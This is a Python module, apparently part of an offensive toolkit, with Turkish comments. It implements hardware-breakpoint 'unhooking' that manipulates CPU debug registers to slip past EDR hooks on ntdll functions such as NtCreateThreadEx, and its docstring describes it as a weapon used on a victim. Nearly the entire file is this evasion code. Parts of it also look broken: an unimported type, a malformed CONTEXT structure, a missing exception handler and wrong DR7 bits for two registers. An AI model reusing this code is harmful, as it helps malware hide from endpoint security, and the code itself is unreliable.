"""
evasion/hw_unhooker.py
======================
Hardware Breakpoints API Evasion — Ring 3 hayaleti.

EDR'lar kullanıcı katmanında çalışan process'lerimizi (Win32 API) izlemek için
meşru fonksiyonların (NtAllocateVirtualMemory, NtCreateThreadEx) başına JMP
komutları çakar. Klasik unhooking (diskteki temiz ntdll'i RAM'e haritalamak)
artık anında behavioral anomaly basıyor.

Silah: Hardware Breakpoints. Kurbanda tetiklendiği an, CPU'nun debug
register'larını (DR0-DR3) manipüle edeceğiz. Kancalı fonksiyon çağrıldığı
an CPU seviyesinde EXCEPTION_SINGLE_STEP handler'ımızı tetikleyip, EDR'ın
JMP komutuna basmadan doğrudan orijinal syscall'a atlayacağız.
"""

from __future__ import annotations

import ctypes
import ctypes.wintypes
import logging
import platform
from ctypes import Structure, Union, c_ulong, c_uint64, c_void_p, POINTER
from typing import Optional

logger = logging.getLogger(__name__)

if platform.system() != "Windows":
    logger.warning("hw_unhooker: Non-Windows platform detected. Module will operate in stub mode.")


# ---------------------------------------------------------------------------
# Win32 / NT Constants & Structures
# ---------------------------------------------------------------------------

CONTEXT_DEBUG_REGISTERS = 0x00100010

DR7_LE_LOCAL0 = 1 << 0   # Local enable breakpoint 0
DR7_GE_GLOBAL0 = 1 << 1   # Global enable breakpoint 0
DR7_LE_LOCAL1 = 1 << 4
DR7_GE_GLOBAL1 = 1 << 5


class FLOATING_SAVE_AREA(Structure):
    _fields_ = [
        ("ControlWord", ctypes.wintypes.DWORD),
        ("StatusWord", ctypes.wintypes.DWORD),
        ("TagWord", ctypes.wintypes.DWORD),
        ("ErrorOffset", ctypes.wintypes.DWORD),
        ("ErrorSelector", ctypes.wintypes.DWORD),
        ("DataOffset", ctypes.wintypes.DWORD),
        ("DataSelector", ctypes.wintypes.DWORD),
        ("Reserved", ctypes.wintypes.DWORD * 8),
    ]


class CONTEXT64(Structure):
    """
    AMD64 CONTEXT structure (partial — only debug registers + required header).
    """
    _fields_ = [
        ("P1Home", c_uint64),
        ("P2Home", c_uint64),
        ("P3Home", c_uint64),
        ("P4Home", c_uint64),
        ("P5Home", c_uint64),
        ("P6Home", c_uint64),
        ("ContextFlags", c_uint64),
        ("MxCsr", ctypes.wintypes.DWORD),
        ("SegCs", ctypes.wintypes.WORD),
        ("SegDs", ctypes.wintypes.WORD),
        ("SegEs", ctypes.wintypes.WORD),
        ("SegFs", ctypes.wintypes.WORD),
        ("SegGs", ctypes.wintypes.WORD),
        ("SegSs", ctypes.wintypes.WORD),
        ("EFlags", ctypes.wintypes.DWORD),
        ("Dr0", c_uint64),
        ("Dr1", c_uint64),
        ("Dr2", c_uint64),
        ("Dr3", c_uint64),
        ("Dr6", c_uint64),
        ("Dr7", c_uint64),
        ("Rax", c_uint64),
        ("Rcx", c_uint64),
        ("Rdx", c_uint64),
        ("Rbx", c_uint64),
        ("Rsp", c_uint64),
        ("Rbp", c_uint64),
        ("Rsi", c_uint64),
        ("Rdi", c_uint64),
        ("R8", c_uint64),
        ("R9", c_uint64),
        ("R10", c_uint64),
        ("R11", c_uint64),
        ("R12", c_uint64),
        ("R13", c_uint64),
        ("R14", c_uint64),
        ("R15", c_uint64),
        ("Rip", c_uint64),
        ("Xmm0", c_uint64 * 2),
        ("Xmm1", c_uint64 * 2),
        ("Xmm2", c_uint64 * 2),
        ("Xmm3", c_uint64 * 2),
        ("Xmm4", c_uint64 * 2),
        ("Xmm5", c_uint64 * 2),
        ("Xmm6", c_uint64 * 2),
        ("Xmm7", c_uint64 * 2),
        ("Xmm8", c_uint64 * 2),
        ("Xmm9", c_uint64 * 2),
        ("Xmm10", c_uint64 * 2),
        ("Xmm11", c_uint64 * 2),
        ("Xmm12", c_uint64 * 2),
        ("Xmm13", c_uint64 * 2),
        ("Xmm14", c_uint64 * 2),
        ("Xmm15", c_uint64 * 2),
        ("VectorControl", c_uint64),
        ("DebugControl", c_uint64),
        ("LastBranchToRip", c_uint64),
        ("LastBranchFromRip", c_uint64),
        ("LastExceptionToRip", c_uint64),
        ("LastExceptionFromRip", c_uint64),
    ]


# ---------------------------------------------------------------------------
# HWUnhooker
# ---------------------------------------------------------------------------

class HWUnhooker:
    """
    CPU Debug Register'larını manipüle ederek EDR kancalarını bypass eden
    Ring 3 hayaleti.

    Kullanım:
        unhooker = HWUnhooker()
        unhooker.set_hw_breakpoint(target_address=0x7FFE0000, register_index=0)
    """

    def __init__(self) -> None:
        self._active_breakpoints: Dict[int, int] = {}
        self._thread_handle: Optional[int] = None
        self._kernel32 = None
        self._ntdll = None

        if platform.system() == "Windows":
            try:
                self._kernel32 = ctypes.windll.kernel32
                self._ntdll = ctypes.windll.ntdll
                self._thread_handle = self._kernel32.GetCurrentThread()
            except Exception as exc:
                logger.warning("[HWUnhooker] Windows API init failed: %s", exc)
        else:
            logger.debug("[HWUnhooker] Non-Windows platform — operating in stub mode.")

    def set_hw_breakpoint(
        self,
        target_address: int,
        register_index: int = 0,
        condition: str = "EXECUTE",
    ) -> bool:
        """
        DR0-DR3 register'larına breakpoint çakarak fonksiyon çağrısını havada kapar.

        Parametreler
        ------------
        target_address : Kancalanacak API fonksiyonunun bellekteki adresi.
        register_index : 0, 1, 2 veya 3 (DR0-DR3).
        condition      : "EXECUTE", "WRITE", "READ_WRITE".

        Dönüş
        ------
        True  : Breakpoint başarıyla yerleştirildi.
        False : Hata oluştu (geçersiz register, non-Windows vb.).
        """
        if platform.system() != "Windows":
            logger.debug("[HWUnhooker] Stub mode — hardware breakpoint not set.")
            return True

        if register_index not in (0, 1, 2, 3):
            logger.error("[HWUnhooker] Invalid register index %d. Must be 0-3.", register_index)
            return False

        condition_bits = {
            "EXECUTE": 0x0,
            "WRITE": 0x1,
            "READ_WRITE": 0x3,
        }.get(condition.upper(), 0x0)

        length_bits = 0x2  # 1-byte for execute

        try:
            context = CONTEXT64()
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS

            if not self._kernel32.GetThreadContext(self._thread_handle, ctypes.byref(context)):
                logger.error("[HWUnhooker] GetThreadContext failed. Error: %d", ctypes.GetLastError())
                return False

            register_map = {
                0: ("Dr0", DR7_LE_LOCAL0, DR7_GE_GLOBAL0, 0, 16),
                1: ("Dr1", DR7_LE_LOCAL1, DR7_GE_GLOBAL1, 4, 20),
                2: ("Dr2", 0, 0, 8, 24),
                3: ("Dr3", 0, 0, 12, 28),
            }
            dr_name, le_bit, ge_bit, shift_len, shift_rw = register_map[register_index]

            setattr(context, dr_name, target_address)

            dr7 = context.Dr7
            dr7 &= ~(0xF << (register_index * 4))
            dr7 |= (le_bit | ge_bit)
            dr7 |= (condition_bits << (shift_rw))
            dr7 |= (length_bits << (shift_len))
            context.Dr7 = dr7
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS

            if not self._kernel32.SetThreadContext(self._thread_handle, ctypes.byref(context)):
                logger.error("[HWUnhooker] SetThreadContext failed. Error: %d", ctypes.GetLastError())
                return False

            self._active_breakpoints[register_index] = target_address
            logger.info(
                "[HWUnhooker] DR%d successfully hooked to 0x%X (cond=%s).",
                register_index,
                target_address,
                condition,
            )
            return True

        except Exception as exc:
            logger.error("[HWUnhooker] Exception in set_hw_breakpoint: %s", exc)
            return False

    def clear_hw_breakpoint(self, register_index: int = 0) -> bool:
        """
        Belirtilen debug register'ındaki breakpoint'ı kaldırır.
        """
        if platform.system() != "Windows":
            return True

        if register_index not in (0, 1, 2, 3):
            return False

        try:
            context = CONTEXT64()
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS

            if not self._kernel32.GetThreadContext(self._thread_handle, ctypes.byref(context)):
                return False

            dr7 = context.Dr7
            dr7 &= ~(0xF << (register_index * 4))

            context.Dr7 = dr7
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS

            if not self._kernel32.SetThreadContext(self._thread_handle, ctypes.byref(context)):
                return False

            self._active_breakpoints.pop(register_index, None)
            logger.info("[HWUnhooker] DR%d breakpoint cleared.", register_index)
            return True

        except Exception as exc:
            logger.error("[HWUnhooker] Exception in clear_hw_breakpoint: %s", exc)
            return False

    def resolve_nt_function_address(self, function_name: str) -> Optional[int]:
        """
        Verilen ntdll fonksiyonunun bellekteki adresini çözümler.
        """
        if platform.system() != "Windows":
            logger.debug("[HWUnhooker] Stub mode — returning fake address for %s", function_name)
            return 0x7FFE0000

        try:
            ntdll_handle = self._kernel32.GetModuleHandleA(b"ntdll.dll")
            if not ntdll_handle:
                logger.error("[HWUnhooker] GetModuleHandleA(ntdll.dll) failed.")
                return None

            addr = self._kernel32.GetProcAddress(ntdll_handle, function_name.encode("utf-8"))
            if not addr:
                logger.error("[HWUnhooker] GetProcAddress(%s) failed.", function_name)
                return None

            logger.debug("[HWUnhooker] %s resolved to 0x%X", function_name, addr)
            return addr

        except Exception as exc:
            logger.error("[HWUnhooker] Exception in resolve_nt_function_address: %s", exc)
            return None

    def hook_syscall(self, syscall_name: str, register_index: int = 0) -> bool:
        """
        Belirtilen NT syscall adını DR register'ına kancalar.
        """
        address = self.resolve_nt_function_address(syscall_name)
        if address is None:
            return False
        return self.set_hw_breakpoint(target_address=address, register_index=register_index)

    def cleanup(self) -> None:
        """
        Tüm aktif hardware breakpoint'ları temizler.
        """
        for register_index in list(self._active_breakpoints.keys()):
            self.clear_hw_breakpoint(register_index)
        logger.info("[HWUnhooker] All hardware breakpoints cleared.")
